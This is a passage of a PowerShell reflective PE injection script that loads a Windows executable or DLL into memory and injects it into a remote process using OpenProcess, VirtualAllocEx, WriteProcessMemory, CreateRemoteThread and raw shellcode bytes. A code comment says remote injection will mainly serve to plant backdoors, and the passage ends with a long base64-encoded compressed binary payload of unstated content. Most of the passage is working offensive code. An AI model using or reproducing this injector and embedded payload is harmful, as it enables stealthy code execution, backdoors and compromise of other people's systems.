		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	Write-Verbose "PowerShell ProcessID: $PID"
	
    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

    

    [System.IO.Directory]::SetCurrentDirectory($pwd)

    #######replace b#######################
$EncodedCompressedFile = @'
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